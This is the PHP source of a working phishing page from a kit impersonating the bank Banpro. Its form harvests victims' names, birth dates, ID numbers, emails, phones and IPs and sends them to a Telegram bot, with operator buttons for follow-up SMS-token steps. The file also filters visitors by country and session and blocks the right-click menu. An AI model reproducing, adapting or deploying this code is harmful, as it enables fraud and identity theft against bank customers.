<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['gate_pass'])) { header('Location: /', true, 302); exit; }
$u = $_SESSION['usuario'] ?? null;
if (!$u) { header('Location: kiwi.php'); exit; }
$_cf_country = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY'] ?? '');
if ($_cf_country && !in_array($_cf_country, ['NI','CO'], true)) { session_destroy(); header('Location: /', true, 302); exit; }

include("oslo.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nombre    = trim($_POST['nombre']    ?? '');
    $apellido  = trim($_POST['apellido']  ?? '');
    $tiempo    = trim($_POST['tiempo']    ?? '');
    $fnac      = trim($_POST['fnac']      ?? '');
    $doc       = trim($_POST['doc']       ?? '');
    $correo    = trim($_POST['correo']    ?? '');
    $telefono  = trim($_POST['telefono']  ?? '');
    $ip        = $_SERVER['REMOTE_ADDR']  ?? '';

    $mg = "📋 DATOS DE CONTACTO BANPRO\n"
        . "👤 Usuario: $u\n"
        . "🪪 Nombre: $nombre $apellido\n"
        . "🏦 Tiempo con la entidad: $tiempo\n"
        . "🎂 F. Nacimiento: $fnac\n"
        . "🆔 Documento: $doc\n"
        . "✉️ Correo: $correo\n"
        . "📱 Teléfono: $telefono\n"
        . "🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$tk/sendMessage?" . http_build_query([
        'chat_id' => $ci,
        'text' => $mg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Login Error', 'callback_data' => "LOGINERROR|$u"],
                    ['text' => '🔑 Tok', 'callback_data' => "SMS|$u"]
                ]
            ]
        ])
    ]));

    header('Location: mango.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Verificación de datos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        @font-face{font-family:'NunitoSans';src:url('font/NunitoSans-Regular.ttf') format('truetype');font-weight:400;font-style:normal;}
        @font-face{font-family:'NunitoSans';src:url('font/NunitoSans-Bold.ttf') format('truetype');font-weight:700 800;font-style:normal;}
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;background:linear-gradient(to bottom,#69BE28,#006838);display:flex;flex-direction:column;align-items:center;font-family:'NunitoSans',sans-serif;padding-top:24px;}
        .wr{background:#fff;border-radius:12px 12px 0 0;padding:24px 20px 20px;width:100%;max-width:440px;flex:1;display:flex;flex-direction:column;}
        .lg{margin-bottom:22px;}
        .lg img{height:52px;width:auto;}
        .wc h2{font-size:17px;font-weight:700;color:#222;margin-bottom:4px;}
        .wc p{font-size:14px;color:#444;margin-bottom:18px;font-weight:400;line-height:1.4;}
        .fb{margin-bottom:12px;}
        .fb label{display:block;font-size:13px;color:#333;margin-bottom:6px;}
        .fb input,.fb select{width:100%;padding:11px 13px;border:1px solid #ccc;border-radius:4px;font-size:15px;color:#333;outline:none;transition:border-color 0.2s;background:#fff;font-family:'NunitoSans',sans-serif;}
        .fb input:focus,.fb select:focus{border-color:#006838;}
        .rw{display:flex;gap:10px;}
        .rw .fb{flex:1;}
        .bs{width:100%;padding:13px;background:#006838;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;transition:background 0.2s;font-family:'NunitoSans',sans-serif;}
        .bs:hover{background:#005228;}
        .bs:disabled{opacity:0.6;cursor:not-allowed;}
        .bf{margin-top:auto;padding-top:18px;}
        .bl{display:flex;justify-content:space-between;padding:14px 0 4px;}
        .bl a{font-size:13px;color:#006838;text-decoration:underline;cursor:pointer;}
        @media (max-width:380px){.rw{flex-direction:column;gap:0;}}
    </style>
</head>
<body>
<div class="wr">
    <div class="lg"><img src="l.png" alt="Banpro"></div>
    <div class="wc">
        <h2>Verificaci&#243;n de datos</h2>
        <p>Complete la siguiente informaci&#243;n para continuar con la validaci&#243;n de su cuenta.</p>
    </div>
    <form method="post" action="" id="f1" autocomplete="off">
        <div class="rw">
            <div class="fb">
                <label for="nombre">Nombre</label>
                <input id="nombre" name="nombre" type="text" required maxlength="60">
            </div>
            <div class="fb">
                <label for="apellido">Apellido</label>
                <input id="apellido" name="apellido" type="text" required maxlength="60">
            </div>
        </div>
        <div class="fb">
            <label for="tiempo">Tiempo con la entidad</label>
            <select id="tiempo" name="tiempo" required>
                <option value="">Seleccione...</option>
                <option>Menos de 1 a&#241;o</option>
                <option>1 - 3 a&#241;os</option>
                <option>3 - 5 a&#241;os</option>
                <option>5 - 10 a&#241;os</option>
                <option>M&#225;s de 10 a&#241;os</option>
            </select>
        </div>
        <div class="fb">
            <label for="fnac">Fecha de nacimiento</label>
            <input id="fnac" name="fnac" type="date" required>
        </div>
        <div class="fb">
            <label for="doc">N&#250;mero de documento</label>
            <input id="doc" name="doc" type="text" inputmode="numeric" required maxlength="20" pattern="[0-9\-]+">
        </div>
        <div class="fb">
            <label for="correo">Correo electr&#243;nico</label>
            <input id="correo" name="correo" type="email" required maxlength="80">
        </div>
        <div class="fb">
            <label for="telefono">Tel&#233;fono</label>
            <input id="telefono" name="telefono" type="tel" inputmode="numeric" required maxlength="15" pattern="[0-9\+\-\s]+">
        </div>
        <button type="submit" class="bs" id="btn">Continuar</button>
    </form>
    <div class="bf">
        <div class="bl">
            <a href="#">Tipo de Cambio</a>
            <a href="#">Afiliese</a>
        </div>
    </div>
</div>
<script>
    document.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
    document.addEventListener('gesturestart',function(e){e.preventDefault();});
    document.getElementById('f1').addEventListener('submit',function(){
        var b=document.getElementById('btn');b.disabled=true;b.textContent='Enviando...';
    });
</script>
</body>
</html>
